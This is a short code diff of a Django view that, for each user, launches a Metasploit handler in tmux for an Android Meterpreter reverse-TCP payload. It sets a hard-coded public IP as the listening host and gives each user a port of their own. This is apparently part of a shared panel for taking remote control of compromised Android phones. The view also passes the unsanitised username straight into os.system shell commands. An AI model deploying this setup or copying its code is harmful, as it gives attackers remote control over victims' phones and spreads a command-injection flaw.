@@ -66,11 +66,12 @@ def startlisten(request):
     dir = '/root/django/users/'+ str(username)+'/'+str(username)
     port=4444+int(request.user.id)
     os.system('tmux send-keys -t '+str(username)+' "msfconsole""\n"')
-    os.system('tmux send-keys -t '+str(username)+' "use multi/handler""\n"')
+    os.system('tmux send-keys -t '+str(username)+' "use exploit/multi/handler""\n"')
     os.system('tmux send-keys -t '+str(username)+' "set payload android/meterpreter/reverse_tcp""\n"')
+    os.system('tmux send-keys -t '+str(username)+' "set ExitOnSession true""\n"')
     os.system('tmux send-keys -t '+str(username)+' "set lhost 185.120.221.217""\n"')
     os.system('tmux send-keys -t '+str(username)+' "set lport '+str(port)+'""\n"')
-    os.system('tmux send-keys -t '+str(username)+' "run""\n"')
+    os.system('tmux send-keys -t '+str(username)+' "exploit""\n"')
 
 
 
